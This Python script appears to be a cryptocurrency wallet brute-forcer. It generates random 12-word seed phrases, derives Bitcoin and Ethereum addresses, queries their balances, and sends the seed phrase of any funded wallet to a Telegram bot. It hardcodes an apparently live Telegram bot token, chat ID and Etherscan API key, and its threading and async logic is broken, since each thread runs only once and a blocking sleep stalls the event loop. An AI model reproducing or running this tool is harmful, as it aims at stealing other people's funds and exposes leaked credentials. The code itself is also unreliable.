import asyncio
import threading
import requests
import time
import random
from bip_utils import Bip39MnemonicGenerator, Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes
from bitcoinrpc.authproxy import AuthServiceProxy

# Telegram bot credentials
TELEGRAM_BOT_TOKEN = "6600045884:AAHCVIaUjbi9a0GbiQpcOEJcpxK-g0iqQsU"
CHAT_ID = "737206288"

# Bitcoin and Ethereum API endpoints
BTC_BALANCE_API = "https://blockchain.info/q/addressbalance/{}"
ETH_BALANCE_API = "https://api.etherscan.io/api?module=account&action=balance&address={}&tag=latest&apikey=75722298119549be9f2e368591eb0a7b"

# Generation counter
total_generations = 0
lock = threading.Lock()

def generate_wallet():
    global total_generations

    try:
        # Generate a 12-word mnemonic
        mnemonic = Bip39MnemonicGenerator().FromWordsNumber(12)
        seed_bytes = Bip39SeedGenerator(mnemonic).Generate()

        # Bitcoin Wallet
        bip44_btc = Bip44.FromSeed(seed_bytes, Bip44Coins.BITCOIN)
        btc_wallet = bip44_btc.Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0)
        btc_address = btc_wallet.PublicKey().ToAddress()

        # Ethereum Wallet
        bip44_eth = Bip44.FromSeed(seed_bytes, Bip44Coins.ETHEREUM)
        eth_wallet = bip44_eth.Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0)
        eth_address = eth_wallet.PublicKey().ToAddress()

        # Check balances
        btc_balance = check_btc_balance(btc_address)
        eth_balance = check_eth_balance(eth_address)

        # Only send results if balance is greater than 0.000000001
        if btc_balance > 0.000000001 or eth_balance > 0.000000001:
            send_to_telegram(mnemonic, btc_address, btc_balance, eth_address, eth_balance)

        with lock:
            total_generations += 1

    except Exception as e:
        print(f"Error in wallet generation: {e}")

def check_btc_balance(address):
    try:
        response = requests.get(BTC_BALANCE_API.format(address))
        return int(response.text) / 100000000  # Convert Satoshis to BTC
    except:
        return 0

def check_eth_balance(address):
    try:
        response = requests.get(ETH_BALANCE_API.format(address))
        data = response.json()
        return int(data["result"]) / 10**18  # Convert Wei to ETH
    except:
        return 0

def send_to_telegram(mnemonic, btc_address, btc_balance, eth_address, eth_balance):
    message = (
        f"🔑 New Wallet Found!\n\n"
        f"📝 Mnemonic: `{mnemonic}`\n"
        f"💰 Bitcoin: {btc_balance} BTC\n"
        f"📌 BTC Address: `{btc_address}`\n\n"
        f"💰 Ethereum: {eth_balance} ETH\n"
        f"📌 ETH Address: `{eth_address}`"
    )
    requests.get(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", 
                 params={"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"})

async def report_generations():
    while True:
        time.sleep(300)  # Wait 5 minutes
        with lock:
            current_count = total_generations
        message = f"⚡ Total wallet generations in last 5 min: {current_count}\n🔄 Total generations: {total_generations}"
        requests.get(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", 
                     params={"chat_id": CHAT_ID, "text": message})
        
async def main():
    num_threads = 10  # Adjust based on your VPS specs
    threads = []

    for _ in range(num_threads):
        thread = threading.Thread(target=generate_wallet)
        thread.daemon = True
        thread.start()
        threads.append(thread)

    # Start reporting task
    await asyncio.gather(report_generations())

if __name__ == "__main__":
    asyncio.run(main())
